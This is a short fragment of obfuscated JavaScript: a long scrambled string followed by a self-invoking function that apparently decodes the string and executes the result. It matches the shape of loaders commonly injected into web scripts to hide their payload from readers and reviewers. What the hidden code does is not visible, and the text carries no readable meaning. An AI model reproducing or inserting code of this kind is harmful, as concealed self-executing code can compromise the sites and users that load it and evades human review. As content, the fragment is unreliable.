%OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
